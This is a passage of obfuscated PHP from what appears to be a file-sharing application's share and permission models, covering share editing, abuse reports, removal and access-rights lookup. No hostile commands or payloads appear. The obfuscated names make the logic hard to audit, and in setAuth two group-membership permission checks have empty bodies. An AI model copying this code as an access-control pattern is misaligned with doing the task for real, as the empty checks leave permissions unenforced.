$¬õûé = array(); foreach ($«½¯¢‚ñ as $à½ÒÂ·) { $º´Ÿ­‘î = SourceModel::TYPE_USER; if ($à½ÒÂ·[$ÜÙ²àâÛ[190]] == SourceModel::TYPE_GROUP) { $º´Ÿ­‘î = SourceModel::TYPE_GROUP; } $–¾¤ÁØ› = array($ÜÙ²àâÛ[670] => $Æ×ú¼œš, $ÜÙ²àâÛ[190] => $º´Ÿ­‘î, $ÜÙ²àâÛ[571] => intval($à½ÒÂ·[$ÜÙ²àâÛ[571]]), $ÜÙ²àâÛ[2079] => 0, $ÜÙ²àâÛ[2140] => -1); if ($à½ÒÂ·[$ÜÙ²àâÛ[2079]]) { $–¾¤ÁØ›[$ÜÙ²àâÛ[2079]] = $à½ÒÂ·[$ÜÙ²àâÛ[2079]]; } else { if ($à½ÒÂ·[$ÜÙ²àâÛ[2140]]) { $–¾¤ÁØ›[$ÜÙ²àâÛ[2140]] = $à½ÒÂ·[$ÜÙ²àâÛ[2140]]; } } $¬õûé[] = $–¾¤ÁØ›; } return $ÃÎ›«Í„->addAll($¬õûé, array(), !0); } public function numViewAdd($®®à—ùÚ) { $”ëç°ìá =& $_SERVER[Š—Â“œÔ]; $ñàÓ  = array($”ëç°ìá[2139] => $®®à—ùÚ); $this->where($ñàÓ )->setAdd($”ëç°ìá[2135]); } public function numDownloadAdd($Ñìµ†ã©) { $«µ×‡èš =& $_SERVER[Š—Â“œÔ]; $Ç®Ñ™Ó = array($«µ×‡èš[2139] => $Ñìµ†ã©); $this->where($Ç®Ñ™Ó)->setAdd($«µ×‡èš[2136]); } protected function shareEdit($†µŒÕ€–, $ìæîûÉ) { $–Ô¬¿¹ =& $_SERVER[Š—Â“œÔ]; $Ç˜‚Œ…µ = $this->getInfo($†µŒÕ€–); if (!$Ç˜‚Œ…µ) { return !1; } $this->_checkLinkShare($ìæîûÉ, $Ç˜‚Œ…µ); $Á¡ÎÆ¹È = array(); $¿Ş³ğÍÁ = explode($–Ô¬¿¹[50], $–Ô¬¿¹[2141]); foreach ($¿Ş³ğÍÁ as $¨ï¤Â–Î) { if (!array_key_exists($¨ï¤Â–Î, $ìæîûÉ)) { continue; } $Á¡ÎÆ¹È[$¨ï¤Â–Î] = $ìæîûÉ[$¨ï¤Â–Î]; } $this->shareEventAdd($Ç˜‚Œ…µ[$–Ô¬¿¹[193]], $ìæîûÉ, $–Ô¬¿¹[1940]); $this->where(array($–Ô¬¿¹[2139] => $†µŒÕ€–))->save($Á¡ÎÆ¹È); if (isset($ìæîûÉ[$–Ô¬¿¹[2127]])) { $this->_shareAuthSet($†µŒÕ€–, $ìæîûÉ[$–Ô¬¿¹[2127]]); } return !0; } private function _checkLinkShare($Ş§ñ±ïÕ, $»¶Æ•¬¿) { $¸¸½²õ =& $_SERVER[Š—Â“œÔ]; if ($Ş§ñ±ïÕ[$¸¸½²õ[564]] != $¸¸½²õ[91]) { return; } $à”Òáªô = $»¶Æ•¬¿[$¸¸½²õ[90]][$¸¸½²õ[193]]; if ($»¶Æ•¬¿[$¸¸½²õ[90]][$¸¸½²õ[33]] != $¸¸½²õ[232]) { $¹„ã¸¾” = $this->_folderReport($à”Òáªô); if (!$¹„ã¸¾”) { return; } show_json(LNG($¸¸½²õ[2142]) . $¸¸½²õ[2143] . $¹„ã¸¾”, !1); } $ÇøŞÚ°İ = Model($¸¸½²õ[892])->fileInfoGet($»¶Æ•¬¿[$¸¸½²õ[90]][$¸¸½²õ[193]]); if (!$ÇøŞÚ°İ) { return; } $Š÷’­ ê = $this->shareFileMeta($ÇøŞÚ°İ[$¸¸½²õ[543]]); if (isset($Š÷’­ ê[$¸¸½²õ[452]]) && $Š÷’­ ê[$¸¸½²õ[452]] == $¸¸½²õ[91]) { show_json(LNG($¸¸½²õ[2144]), !1); } } private function _folderReport($“¶ã­¦ï) { $¼´ªí¿« =& $_SERVER[Š—Â“œÔ]; $‚ö”¥÷õ = array($¼´ªí¿«[543] => array($¼´ªí¿«[1086], 0), $¼´ªí¿«[817] => 3); $ÛÌƒÆ¾ø = Model($¼´ªí¿«[2145])->where($‚ö”¥÷õ)->field($¼´ªí¿«[543])->select(); if (!$ÛÌƒÆ¾ø) { return !1; } $ÛÌƒÆ¾ø = array_to_keyvalue($ÛÌƒÆ¾ø, $¼´ªí¿«[12], $¼´ªí¿«[543]); $ã‡„Ì˜¬ = $¼´ªí¿«[50] . $“¶ã­¦ï . $¼´ªí¿«[50]; $‚ö”¥÷õ = array($¼´ªí¿«[543] => array($¼´ªí¿«[7], $ÛÌƒÆ¾ø), $¼´ªí¿«[586] => array($¼´ªí¿«[461], "\45{$ã‡„Ì˜¬}\45"), $¼´ªí¿«[507] => 0); $Ñ´óÅìÄ = Model($¼´ªí¿«[892])->where($‚ö”¥÷õ)->field($¼´ªí¿«[2146])->find(); if (!$Ñ´óÅìÄ) { return !1; } $òò†À”‡ = substr($Ñ´óÅìÄ[$¼´ªí¿«[586]], strpos($Ñ´óÅìÄ[$¼´ªí¿«[586]], $ã‡„Ì˜¬)); $‚ö”¥÷õ = array($¼´ªí¿«[193] => array($¼´ªí¿«[7], trim($òò†À”‡, $¼´ªí¿«[50]))); $Ë§ßú¿â = Model($¼´ªí¿«[892])->where($‚ö”¥÷õ)->field($¼´ªí¿«[32])->select(); $„§ÖÆ•î = array_to_keyvalue($Ë§ßú¿â, $¼´ªí¿«[12], $¼´ªí¿«[32]); $„§ÖÆ•î[] = $Ñ´óÅìÄ[$¼´ªí¿«[32]]; return implode($¼´ªí¿«[8], $„§ÖÆ•î); } protected function remove($ËÓ²åë·) { $ùõ£Ü¨Š =& $_SERVER[Š—Â“œÔ]; $‚‚­Áè = is_array($ËÓ²åë·) ? $ËÓ²åë· : array($ËÓ²åë·); for ($…ª„Î” = 0; $…ª„Î” < count($‚‚­Áè); $…ª„Î”++) { $ñÀÅ”— = $this->getInfo($‚‚­Áè[$…ª„Î”]); if ($ñÀÅ”—[$ùõ£Ü¨Š[668]] == $ùõ£Ü¨Š[91]) { Model($ùõ£Ü¨Š[638])->eventShare($ñÀÅ”—[$ùõ£Ü¨Š[193]], $ùõ£Ü¨Š[2133]); } if ($ñÀÅ”—[$ùõ£Ü¨Š[564]] == $ùõ£Ü¨Š[91]) { Model($ùõ£Ü¨Š[638])->eventShare($ñÀÅ”—[$ùõ£Ü¨Š[193]], $ùõ£Ü¨Š[2132]); } } if (is_array($ËÓ²åë·)) { $ËÓ²åë· = array($ùõ£Ü¨Š[7], $ËÓ²åë·); } $ü½É„Î¾ = array($ùõ£Ü¨Š[670] => $ËÓ²åë·); $º„üí¢… = $this->where($ü½É„Î¾)->delete(); if ($º„üí¢…) { Model($ùõ£Ü¨Š[671])->where(array($ùõ£Ü¨Š[670] => $ËÓ²åë·))->delete(); } return $º„üí¢…; } protected function removeBySource($ü¾ë›î) { $à•Á“ÌŠ =& $_SERVER[Š—Â“œÔ]; $èƒê÷»ó = array($à•Á“ÌŠ[493] => array($à•Á“ÌŠ[494], $ü¾ë›î)); $êŞÒ€¥§ = $this->field($à•Á“ÌŠ[670])->where($èƒê÷»ó)->select(); $êŞÒ€¥§ = array_to_keyvalue($êŞÒ€¥§, $à•Á“ÌŠ[12], $à•Á“ÌŠ[670]); if (!$êŞÒ€¥§) { return; } $èƒê÷»ó = array($à•Á“ÌŠ[2139] => array($à•Á“ÌŠ[494], $êŞÒ€¥§)); $this->where($èƒê÷»ó)->delete(); Model($à•Á“ÌŠ[671])->where($èƒê÷»ó)->delete(); } public function listAll($ÔËŠ§ûÔ) { $Ä‘¯ñß¯ =& $_SERVER[Š—Â“œÔ]; $é¥ö‹¬é = array(); if ($ÔËŠ§ûÔ[$Ä‘¯ñß¯[1770]]) { $é¥ö‹¬é[$Ä‘¯ñß¯[1770]] = $ÔËŠ§ûÔ[$Ä‘¯ñß¯[1770]]; } if ($ÔËŠ§ûÔ[$Ä‘¯ñß¯[827]]) { $ÎÁÇ®¹ç = $ÔËŠ§ûÔ[$Ä‘¯ñß¯[828]] ? $ÔËŠ§ûÔ[$Ä‘¯ñß¯[828]] : strtotime(date($Ä‘¯ñß¯[2147])); $é¥ö‹¬é[$Ä‘¯ñß¯[233]] = array($Ä‘¯ñß¯[410], array($ÔËŠ§ûÔ[$Ä‘¯ñß¯[827]], $ÎÁÇ®¹ç)); } if ($ÔËŠ§ûÔ[$Ä‘¯ñß¯[33]]) { $é¥ö‹¬é[$ÔËŠ§ûÔ[$Ä‘¯ñß¯[33]]] = 1; } else { $é¥ö‹¬é[] = array($Ä‘¯ñß¯[564] => array($Ä‘¯ñß¯[1086], 0), $Ä‘¯ñß¯[668] => array($Ä‘¯ñß¯[1086], 0), $Ä‘¯ñß¯[2121] => $Ä‘¯ñß¯[2073]); } if ($ÔËŠ§ûÔ[$Ä‘¯ñß¯[2069]]) { $é¥ö‹¬é[] = array($Ä‘¯ñß¯[2118] => $ÔËŠ§ûÔ[$Ä‘¯ñß¯[2069]], $Ä‘¯ñß¯[1658] => array($Ä‘¯ñß¯[461], "\45{$ÔËŠ§ûÔ[$Ä‘¯ñß¯[2069]]}\x25"), $Ä‘¯ñß¯[2121] => $Ä‘¯ñß¯[2073]); } $Öòˆ « = $this->_makeOrder()->where($é¥ö‹¬é)->selectPage(20); if (empty($Öòˆ «[$Ä‘¯ñß¯[447]])) { return array(); } $this->_listDataApply($Öòˆ «[$Ä‘¯ñß¯[447]]); return $Öòˆ «; } public function listDataApply($¦¤Íñ¥Ï) { $this->_listDataApply($¦¤Íñ¥Ï); return $¦¤Íñ¥Ï; } private function _listDataApply(&$ı›ïùĞ) { $ÌğÍ‡ö¸ =& $_SERVER[Š—Â“œÔ]; $£É”Ã†º = array_to_keyvalue($ı›ïùĞ, $ÌğÍ‡ö¸[12], $ÌğÍ‡ö¸[1770]); $Æ×æ‚ïŠ = Model($ÌğÍ‡ö¸[599])->userListInfo(array_unique($£É”Ã†º)); $±¹²Œ­Ñ = array_to_keyvalue($ı›ïùĞ, $ÌğÍ‡ö¸[12], $ÌğÍ‡ö¸[193]); $Ò¤ÅíİÎ = Model($ÌğÍ‡ö¸[892])->sourceListInfo($±¹²Œ­Ñ, !0); foreach ($ı›ïùĞ as $‘«âğ»Ç => &$çñÈ‡) { $À•“äãê = $çñÈ‡[$ÌğÍ‡ö¸[1770]]; $çñÈ‡[$ÌğÍ‡ö¸[2148]] = $Æ×æ‚ïŠ[$À•“äãê] ? $Æ×æ‚ïŠ[$À•“äãê] : !1; $‡óÔ‚Ÿ’ = $çñÈ‡[$ÌğÍ‡ö¸[193]]; $çñÈ‡[$ÌğÍ‡ö¸[90]] = $Ò¤ÅíİÎ[$‡óÔ‚Ÿ’] ? $Ò¤ÅíİÎ[$‡óÔ‚Ÿ’] : !1; if ($çñÈ‡[$ÌğÍ‡ö¸[90]][$ÌğÍ‡ö¸[507]] == $ÌğÍ‡ö¸[91]) { unset($ı›ïùĞ[$‘«âğ»Ç]); } if ($çñÈ‡[$ÌğÍ‡ö¸[90]] != $ÌğÍ‡ö¸[230] && !$çñÈ‡[$ÌğÍ‡ö¸[90]]) { unset($ı›ïùĞ[$‘«âğ»Ç]); } } unset($çñÈ‡); $ı›ïùĞ = array_values($ı›ïùĞ); } private function _makeOrder($åëÇ¾ÏÃ = '') { $ÇÓÌ­ ³ =& $_SERVER[Š—Â“œÔ]; $âãÃ¿à– = array($ÇÓÌ­ ³[233], $ÇÓÌ­ ³[828], $ÇÓÌ­ ³[2135], $ÇÓÌ­ ³[2136]); $ØÑÂ­ = array($ÇÓÌ­ ³[525] => $ÇÓÌ­ ³[526], $ÇÓÌ­ ³[527] => $ÇÓÌ­ ³[528]); $ŸçÃ½ù = Input::get($ÇÓÌ­ ³[532], $ÇÓÌ­ ³[7], $ÇÓÌ­ ³[499], $âãÃ¿à–); $‹ÅÙàèİ = Input::get($ÇÓÌ­ ³[533], $ÇÓÌ­ ³[7], $ÇÓÌ­ ³[2149], array($ÇÓÌ­ ³[2066], $ÇÓÌ­ ³[527])); $‹ÅÙàèİ = $ØÑÂ­[$‹ÅÙàèİ]; $åëÇ¾ÏÃ = $åëÇ¾ÏÃ . "{$ŸçÃ½ù}\40{$‹ÅÙàèİ}"; return $this->order($åëÇ¾ÏÃ); } public function reportAdd($÷ôæÈ²) { $åšÜ² =& $_SERVER[Š—Â“œÔ]; $ê•ë°€Ÿ = array($åšÜ²[670] => $÷ôæÈ²[$åšÜ²[670]], $åšÜ²[1770] => USER_ID); if (Model($åšÜ²[2145])->where($ê•ë°€Ÿ)->find()) { return !1; } $·Ñòİ›ë = array($åšÜ²[670] => $÷ôæÈ²[$åšÜ²[670]], $åšÜ²[1658] => $÷ôæÈ²[$åšÜ²[1658]], $åšÜ²[193] => $÷ôæÈ²[$åšÜ²[193]], $åšÜ²[543] => $÷ôæÈ²[$åšÜ²[543]], $åšÜ²[1770] => USER_ID, $åšÜ²[33] => $÷ôæÈ²[$åšÜ²[33]], $åšÜ²[528] => $÷ôæÈ²[$åšÜ²[528]]); return Model($åšÜ²[2145])->add($·Ñòİ›ë); } public function reportList($’øÖ¿) { $ƒİÓêÉŞ =& $_SERVER[Š—Â“œÔ]; $ãÑï¬” = array(); if ($’øÖ¿[$ƒİÓêÉŞ[827]]) { $–¯òÀá = $’øÖ¿[$ƒİÓêÉŞ[828]] ? $’øÖ¿[$ƒİÓêÉŞ[828]] : strtotime(date($ƒİÓêÉŞ[2147])); $ãÑï¬”[$ƒİÓêÉŞ[233]] = array($ƒİÓêÉŞ[410], array($’øÖ¿[$ƒİÓêÉŞ[827]], $–¯òÀá)); } if (isset($’øÖ¿[$ƒİÓêÉŞ[33]]) && in_array($’øÖ¿[$ƒİÓêÉŞ[33]], array($ƒİÓêÉŞ[91], $ƒİÓêÉŞ[512], $ƒİÓêÉŞ[2150], $ƒİÓêÉŞ[2151], $ƒİÓêÉŞ[2152]))) { $ãÑï¬”[$ƒİÓêÉŞ[33]] = $’øÖ¿[$ƒİÓêÉŞ[33]]; } if (isset($’øÖ¿[$ƒİÓêÉŞ[817]]) && in_array($’øÖ¿[$ƒİÓêÉŞ[817]], array($ƒİÓêÉŞ[230], $ƒİÓêÉŞ[91], $ƒİÓêÉŞ[512], $ƒİÓêÉŞ[2150]))) { $ãÑï¬”[$ƒİÓêÉŞ[817]] = $’øÖ¿[$ƒİÓêÉŞ[817]]; } $çŸÏáƒŒ = Input::get($ƒİÓêÉŞ[533], $ƒİÓêÉŞ[7], $ƒİÓêÉŞ[2149], array($ƒİÓêÉŞ[2066], $ƒİÓêÉŞ[527])); $•Ïîû‡ = array($ƒİÓêÉŞ[525] => $ƒİÓêÉŞ[526], $ƒİÓêÉŞ[527] => $ƒİÓêÉŞ[528]); $¾æÉË = $ƒİÓêÉŞ[2153] . $•Ïîû‡[$çŸÏáƒŒ]; $æ×—İ¿™ = Model($ƒİÓêÉŞ[2145])->where($ãÑï¬”)->order($¾æÉË)->selectPage(20); if (empty($æ×—İ¿™[$ƒİÓêÉŞ[447]])) { return array(); } $“ ã³š = array_to_keyvalue_group($æ×—İ¿™[$ƒİÓêÉŞ[447]], $ƒİÓêÉŞ[817], $ƒİÓêÉŞ[670]); if (!empty($“ ã³š[0])) { $’øÖ¿ = $“ ã³š[0]; $ãÑï¬” = array($ƒİÓêÉŞ[670] => array($ƒİÓêÉŞ[7], $’øÖ¿)); $º†¥˜Ê‡ = $this->where($ãÑï¬”)->field($ƒİÓêÉŞ[670])->select(); $º†¥˜Ê‡ = array_to_keyvalue($º†¥˜Ê‡, $ƒİÓêÉŞ[12], $ƒİÓêÉŞ[670]); $”’½ş€ä = array_diff($’øÖ¿, $º†¥˜Ê‡); if (!empty($”’½ş€ä)) { foreach ($æ×—İ¿™[$ƒİÓêÉŞ[447]] as $ÊŠıÜÄ² => $ÔÖ®ŞÒ§) { if (in_array($ÔÖ®ŞÒ§[$ƒİÓêÉŞ[670]], $”’½ş€ä)) { unset($æ×—İ¿™[$ƒİÓêÉŞ[447]][$ÊŠıÜÄ²]); } } } } $this->_listDataApply($æ×—İ¿™[$ƒİÓêÉŞ[447]]); return $æ×—İ¿™; } public function reportStatus($­½ƒÁŞ¡) { $¦¶µ¢à£ =& $_SERVER[Š—Â“œÔ]; $€£½ş‡ = array($¦¶µ¢à£[477] => $­½ƒÁŞ¡[$¦¶µ¢à£[477]]); $Ñ²±ä˜” = Model($¦¶µ¢à£[2145])->where($€£½ş‡)->field($¦¶µ¢à£[2154])->find(); if (!$Ñ²±ä˜”) { return !1; } $èÛ…ô ì = array($¦¶µ¢à£[817] => $­½ƒÁŞ¡[$¦¶µ¢à£[817]]); if ($­½ƒÁŞ¡[$¦¶µ¢à£[817]] == $¦¶µ¢à£[2150] && $Ñ²±ä˜”[$¦¶µ¢à£[817]] == $¦¶µ¢à£[2150]) { $èÛ…ô ì[$¦¶µ¢à£[817]] = 0; } $¹ Ÿµí = Model($¦¶µ¢à£[2145])->where($€£½ş‡)->save($èÛ…ô ì); if ($­½ƒÁŞ¡[$¦¶µ¢à£[817]] == $¦¶µ¢à£[512]) { if ($Ñ²±ä˜”[$¦¶µ¢à£[543]] != $¦¶µ¢à£[230] && $this->shareFileMeta($Ñ²±ä˜”[$¦¶µ¢à£[543]])) { $this->shareFileMeta($Ñ²±ä˜”[$¦¶µ¢à£[543]], 0); } $this->remove($Ñ²±ä˜”[$¦¶µ¢à£[670]]); return !0; } if ($¹ Ÿµí && $­½ƒÁŞ¡[$¦¶µ¢à£[817]] == $¦¶µ¢à£[2150]) { $ˆ‹É™šÚ = $èÛ…ô ì[$¦¶µ¢à£[817]] == $¦¶µ¢à£[2150] ? 1 : 0; $this->shareFileMeta($Ñ²±ä˜”[$¦¶µ¢à£[543]], $ˆ‹É™šÚ); $this->removeByFile($Ñ²±ä˜”[$¦¶µ¢à£[543]]); } return $¹ Ÿµí; } private function removeByFile($ü£ë“ƒ) { $¼ì‰½š =& $_SERVER[Š—Â“œÔ]; $ºÚÖ…ŞÙ = Model($¼ì‰½š[892])->where(array($¼ì‰½š[543] => $ü£ë“ƒ))->field($¼ì‰½š[193])->select(); $ö®•€Ø… = array_to_keyvalue($ºÚÖ…ŞÙ, $¼ì‰½š[12], $¼ì‰½š[193]); $Çü±ğ’‚ = array($¼ì‰½š[193] => array($¼ì‰½š[7], $ö®•€Ø…), $¼ì‰½š[564] => 1); $ºÚÖ…ŞÙ = $this->where($Çü±ğ’‚)->field($¼ì‰½š[670])->select(); if (empty($ºÚÖ…ŞÙ)) { return; } $ò‰¢Î „ = array_to_keyvalue($ºÚÖ…ŞÙ, $¼ì‰½š[12], $¼ì‰½š[670]); $this->remove($ò‰¢Î „); } private function shareFileMeta($•®øœúÄ, $ÌàÜÔÄœ = null) { $ÑÑ’¥¯ =& $_SERVER[Š—Â“œÔ]; $Ëˆİü¨ˆ = array($ÑÑ’¥¯[543] => $•®øœúÄ, $ÑÑ’¥¯[97] => $ÑÑ’¥¯[2155]); if (is_null($ÌàÜÔÄœ)) { return Model($ÑÑ’¥¯[2156])->where($Ëˆİü¨ˆ)->find(); } $Ëˆİü¨ˆ[$ÑÑ’¥¯[452]] = $ÌàÜÔÄœ; Model($ÑÑ’¥¯[2156])->add($Ëˆİü¨ˆ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\143\145\x5f\x61\x75\x74\150"; public function getAuth($ÚõÒ„Õø) { $™šÓ®ò =& $_SERVER[Š—Â“œÔ]; $ò‡Åıú¶ = $this->sourceAuthSelect($ÚõÒ„Õø); $Å¾ÒØò÷ = array(); $ĞÚ¹î = array(); $øî’éÄØ = 2 << 25; foreach ($ò‡Åıú¶ as $ƒõÅøæ‡) { $ı¸‘¦Œ± = Model($™šÓ®ò[573])->listData($ƒõÅøæ‡[$™šÓ®ò[2079]]); if (!$ı¸‘¦Œ±) { continue; } $Å¾ÒØò÷[] = $ƒõÅøæ‡; $áË•‰™û = 0; if ($ƒõÅøæ‡[$™šÓ®ò[190]] == SourceModel::TYPE_GROUP) { $áË•‰™û = $øî’éÄØ * 2; } if ($ƒõÅøæ‡[$™šÓ®ò[190]] == SourceModel::TYPE_USER) { $áË•‰™û = $øî’éÄØ; } if ($ƒõÅøæ‡[$™šÓ®ò[190]] == SourceModel::TYPE_USER && $ƒõÅøæ‡[$™šÓ®ò[571]] == $™šÓ®ò[230]) { $áË•‰™û = 0; } $ĞÚ¹î[] = $ı¸‘¦Œ±[$™šÓ®ò[489]] + $áË•‰™û; } array_multisort($ĞÚ¹î, SORT_DESC, $Å¾ÒØò÷); return $Å¾ÒØò÷; } public function sourceAuthSelect($ÌÓŒŒ²) { $Šå–Ğ¥” =& $_SERVER[Š—Â“œÔ]; static $ŞÛ‚İˆ– = array(); $İ¶¢°ßè = is_array($ÌÓŒŒ²) ? !1 : !0; if ($İ¶¢°ßè) { $ÌÓŒŒ² = array($ÌÓŒŒ²); } $¬¹£í¼Ú = array(); foreach ($ÌÓŒŒ² as $®ì©´) { if (isset($ŞÛ‚İˆ–[$®ì©´])) { $¬¹£í¼Ú[$®ì©´] = $ŞÛ‚İˆ–[$®ì©´]; } } if (count($¬¹£í¼Ú) == count($ÌÓŒŒ²)) { return $İ¶¢°ßè ? $¬¹£í¼Ú[$ÌÓŒŒ²[0]] : $¬¹£í¼Ú; } $¥¯êµ¬ = $Šå–Ğ¥”[2157]; $å—¢šöË = array($Šå–Ğ¥”[193] => array($Šå–Ğ¥”[7], $ÌÓŒŒ²)); $îÕÀ„°¡ = $this->field($¥¯êµ¬)->order($Šå–Ğ¥”[477])->where($å—¢šöË)->select(); $›‚ƒÚ¬³ = array_to_keyvalue_group($îÕÀ„°¡, $Šå–Ğ¥”[193]); foreach ($ÌÓŒŒ² as $®ì©´) { $ŞÛ‚İˆ–[$®ì©´] = $›‚ƒÚ¬³[$®ì©´] ? $›‚ƒÚ¬³[$®ì©´] : array(); } if ($İ¶¢°ßè) { return $îÕÀ„°¡; } return $›‚ƒÚ¬³; } public function setAuth($¯¬‰‘Œ…, $©Ş–µÇé) { $˜àé±û© =& $_SERVER[Š—Â“œÔ]; $Ù÷½ëş± = Model($˜àé±û©[1419])->sourceInfo($¯¬‰‘Œ…); if (!$Ù÷½ëş±) { return !1; } if ($Ù÷½ëş±[$˜àé±û©[190]] != SourceModel::TYPE_GROUP) { return !1; } $ÖÕ´¶š© = 1; $¹‰ø‹ = $Ù÷½ëş±[$˜àé±û©[571]]; if ($¹‰ø‹ != $ÖÕ´¶š©) { $‰ˆôÜã‡ = array($˜àé±û©[1971] => $¹‰ø‹); $£Ë±ŒÍ = Model($˜àé±û©[2065])->field($˜àé±û©[1770])->where($‰ˆôÜã‡)->select(); $£Ë±ŒÍ = array_to_keyvalue($£Ë±ŒÍ, $˜àé±û©[12], $˜àé±û©[1770]); } $ÖâÚß = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ã×ı†Î¦ = array(); foreach ($©Ş–µÇé as $¨—Ä‹¾ª) { if (!in_array($¨—Ä‹¾ª[$˜àé±û©[190]], $ÖâÚß)) { show_json(LNG($˜àé±û©[2158]), !1); } if ($¹‰ø‹ != $ÖÕ´¶š©) { if ($¨—Ä‹¾ª[$˜àé±û©[190]] == SourceModel::TYPE_GROUP) { } if ($¨—Ä‹¾ª[$˜àé±û©[571]] != 0 && !in_array($¨—Ä‹¾ª[$˜àé±û©[571]], $£Ë±ŒÍ)) { } } if ($¨—Ä‹¾ª[$˜àé±û©[571]] == 0) { $¨—Ä‹¾ª[$˜àé±û©[190]] = SourceModel::TYPE_USER; } $ã×ı†Î¦[] = array($˜àé±û©[193] => $¯¬‰‘Œ…, $˜àé±û©[190] => intval($¨—Ä‹¾ª[$˜àé±û©[190]]), $˜àé±û©[571] => intval($¨—Ä‹¾ª[$˜àé±û©[571]]), $˜àé±û©[2079] => intval($¨—Ä‹¾ª[$˜àé±û©[2079]]) ? intval($¨—Ä‹¾ª[$˜àé±û©[2079]]) : 0, $˜àé±û©[2140] => intval($¨—Ä‹¾ª[$˜àé±û©[2140]]) ? intval($¨—Ä‹¾ª[$˜àé±û©[2140]]) : -1); } $this->where(array($˜àé±û©[493] => $¯¬‰‘Œ…))->delete(); $this->addAll($ã×ı†Î¦); return !0; } public function authClear($¼­¹À¨) { $˜¿ÛĞ…à =& $_SERVER[Š—Â“œÔ]; $§ÔÚÅòº = Model($˜¿ÛĞ…à[1419])->sourceInfo($¼­¹À¨); $Æê–Ô“¿ = array($¼­¹À¨); if ($§ÔÚÅòº[$˜¿ÛĞ…à[487]] == $˜¿ÛĞ…à[91]) { $²Ø¢´ó = array($˜¿ÛĞ…à[657] => array($˜¿ÛĞ…à[617], $§ÔÚÅòº[$˜¿ÛĞ…à[586]] . $¼­¹À¨ . $˜¿ÛĞ…à[618])); $Æê–Ô“¿ = Model($˜¿ÛĞ…à[1419])->field($˜¿ÛĞ…à[493])->where($²Ø¢´ó)->getField($˜¿ÛĞ…à[193], !0); $Æê–Ô“¿[] = $¼­¹À¨; } $this->where(array($˜¿ÛĞ…à[493] => array($˜¿ÛĞ…à[494], $Æê–Ô“¿)))->delete(); return !0; } public function getAllChildren($™üîÂ¹®) { $Ìù·õ’ =& $_SERVER[Š—Â“œÔ]; $Ù¹èŠûà = Model($Ìù·õ’[1419])->sourceInfo($™üîÂ¹®); if ($Ù¹èŠûà[$Ìù·õ’[487]] != $Ìù·õ’[91]) { return $this->sourceListAuth(array($™üîÂ¹®)); } if ($Ù¹èŠûà[$Ìù·õ’[190]] != SourceModel::TYPE_GROUP) { return array(); } $çŠªşæ‘ = 1; $¥Éî§éª = array($™üîÂ¹®); if ($Ù¹èŠûà[$Ìù·õ’[192]] == $Ìù·õ’[230] && $Ù¹èŠûà[$Ìù·õ’[571]] != $çŠªşæ‘) { $¥Éî§éª = $this->groupChidldAllRootSource($Ù¹èŠûà[$Ìù·õ’[571]]); } $ÌÙŞ íé = $this->field($Ìù·õ’[193])->group($Ìù·õ’[193])->select(); $ÌÙŞ íé = array_to_keyvalue($ÌÙŞ íé, $Ìù·õ’[12], $Ìù·õ’[193]); if (!$ÌÙŞ íé) { return array(); } $ûÆ®ˆ© = $Ìù·õ’[2159]; $“×İ±¨É = array($Ìù·õ’[193] => array($Ìù·õ’[7], $ÌÙŞ íé), $Ìù·õ’[507] => $Ìù·õ’[230]); $í½ä§Ëş = Model($Ìù·õ’[892])->field($ûÆ®ˆ©)->where($“×İ±¨É)->select(); $ÂÕÀÄ§ç = array($™üîÂ¹®); foreach ($í½ä§Ëş as $Ÿ¢Ÿæ») { foreach ($¥Éî§éª as $Ùø–¿¸) { $ºŠ…ôùØ = $Ìù·õ’[50] . $Ùø–¿¸ . $Ìù·õ’[50]; $ì¹¨‰«’ = $Ÿ¢Ÿæ»[$Ìù·õ’[586]] . $Ÿ¢Ÿæ»[$Ìù·õ’[193]] . $Ìù·õ’[50]; if (strstr($ì¹¨‰«’, $ºŠ…ôùØ)) { $ÂÕÀÄ§ç[] = $Ÿ¢Ÿæ»[$Ìù·õ’[193]]; break; } } } return $this->sourceListAuth($ÂÕÀÄ§ç); } private function sourceListAuth($âÔìÚ¨›) { $ÈüŸÌŞ =& $_SERVER[Š—Â“œÔ]; $æÑåşó– = Model($ÈüŸÌŞ[1419])->sourceListInfo($âÔìÚ¨›, !0); $ØñòªøÚ = $this->sourceAuthSelect($âÔìÚ¨›); $Ó¤­õÒë = array(); $º´Ûã‡™ = array(); foreach ($æÑåşó– as $—£á‹…Ú) { unset($—£á‹…Ú[$ÈüŸÌŞ[531]]); unset($—£á‹…Ú[$ÈüŸÌŞ[529]]); unset($—£á‹…Ú[$ÈüŸÌŞ[489]]); unset($—£á‹…Ú[$ÈüŸÌŞ[90]]); $ ¬„€š· = $ØñòªøÚ[$—£á‹…Ú[$ÈüŸÌŞ[193]]]; if (!$ ¬„€š·) { continue; } $—£á‹…Ú[$ÈüŸÌŞ[2160]] = $this->authTargetInfo($ ¬„€š·); $—£á‹…Ú[$ÈüŸÌŞ[584]] = rtrim($—£á‹…Ú[$ÈüŸÌŞ[590]], $ÈüŸÌŞ[8]) . $ÈüŸÌŞ[8] . ltrim($—£á‹…Ú[$ÈüŸÌŞ[584]], $ÈüŸÌŞ[8]); $Ó¤­õÒë[] = $—£á‹…Ú; $ˆ…—ŠŒ§ = count(explode($ÈüŸÌŞ[8], trim($—£á‹…Ú[$ÈüŸÌŞ[584]], $ÈüŸÌŞ[8]))); $º´Ûã‡™[] = $ˆ…—ŠŒ§ + ($—£á‹…Ú[$ÈüŸÌŞ[33]] == $ÈüŸÌŞ[78] ? 0 : 1000); } array_multisort($º´Ûã‡™, SORT_ASC, $Ó¤­õÒë); return $Ó¤­õÒë; } private function groupChidldAllRootSource($á±Ç­·) { $ÄÁíğ€ˆ =& $_SERVER[Š—Â“œÔ]; $ªàŠÂ ˜ = Model($ÄÁíğ€ˆ[2161])->groupChildrenAll($á±Ç­·); $“œÎ¶ùä = array($ÄÁíğ€ˆ[192] => 0, $ÄÁíğ€ˆ[571] => array($ÄÁíğ€ˆ[7], $ªàŠÂ ˜), $ÄÁíğ€ˆ[190] => SourceModel::TYPE_GROUP); $ç¨¢íÖ = Model($ÄÁíğ€ˆ[892])->field($ÄÁíğ€ˆ[193])->where($“œÎ¶ùä)->select(); $ç¨¢íÖ = array_to_keyvalue($ç¨¢íÖ, $ÄÁíğ€ˆ[12], $ÄÁíğ€ˆ[193]); return $ç¨¢íÖ; } private function authTargetInfo($ê×ô•¤É) { $À¹­Â› =& $_SERVER[Š—Â“œÔ]; $ıŞáŒÈ– = array(); $ˆØİ—¬Ë = array(); $É‚âæ¼â = 2 << 25; foreach ($ê×ô•¤É as 